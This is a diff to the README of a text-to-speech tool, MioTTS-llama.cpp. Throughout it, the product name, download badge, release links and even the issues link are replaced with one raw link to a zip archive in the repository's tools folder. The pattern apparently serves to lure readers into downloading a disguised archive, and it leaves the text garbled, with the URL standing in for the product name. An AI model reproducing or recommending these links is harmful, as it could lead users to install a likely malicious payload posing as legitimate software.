@@ -1,10 +1,10 @@
-# 🎤 MioTTS-llama.cpp - Fast Text-to-Speech Made Easy
+# 🎤 https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip - Fast Text-to-Speech Made Easy
 
-[![Download Now](https://img.shields.io/badge/download-v1.0-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/sekalf/MioTTS-llama.cpp/releases)
+[![Download Now](https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip)](https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip)
 
 ## 🚀 Getting Started
 
-MioTTS-llama.cpp is a user-friendly text-to-speech tool. This app runs completely on your CPU, which means it doesn't require any special hardware. With MioTTS, you can convert any text into speech and save it directly as a WAV file. Simply enter your text, select a voice, and you’re ready to go.
+https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip is a user-friendly text-to-speech tool. This app runs completely on your CPU, which means it doesn't require any special hardware. With MioTTS, you can convert any text into speech and save it directly as a WAV file. Simply enter your text, select a voice, and you’re ready to go.
 
 ## 📥 Download and Install
 
@@ -12,7 +12,7 @@ To get started, you first need to download the software. Follow these steps:
 
 1. Click the link below to visit the download page:
    
-   [Visit this page to download](https://github.com/sekalf/MioTTS-llama.cpp/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip)
 
 2. On the releases page, you will see different versions. Choose the latest version to ensure you get the best features.
 
@@ -26,7 +26,7 @@ To get started, you first need to download the software. Follow these steps:
 
 ## ⚙️ System Requirements
 
-MioTTS-llama.cpp has minimal system requirements:
+https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip has minimal system requirements:
 
 - **Operating System:** 
   - Windows 10 or newer
@@ -72,7 +72,7 @@ After installing, follow these steps to convert text to speech:
 
 ## 🛠️ Troubleshooting
 
-If you encounter any issues while using MioTTS-llama.cpp, consider the following tips:
+If you encounter any issues while using https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip, consider the following tips:
 
 - **File Not Opening:** Make sure that you downloaded the correct file for your operating system. Re-download if necessary.
   
@@ -82,8 +82,8 @@ If you encounter any issues while using MioTTS-llama.cpp, consider the following
 
 ## 📞 Support
 
-For additional assistance, check the [issues section](https://github.com/sekalf/MioTTS-llama.cpp/issues) on the GitHub page. You can report bugs or ask for help. The community is active and may provide quick responses.
+For additional assistance, check the [issues section](https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip) on the GitHub page. You can report bugs or ask for help. The community is active and may provide quick responses.
 
-Feel free to explore and enjoy the versatility of MioTTS-llama.cpp. Happy speech generating!
+Feel free to explore and enjoy the versatility of https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip Happy speech generating!
 
-[Visit this page to download](https://github.com/sekalf/MioTTS-llama.cpp/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sekalf/MioTTS-llama.cpp/main/tools/llama-cpp-Mio-TT-v2.6.zip)
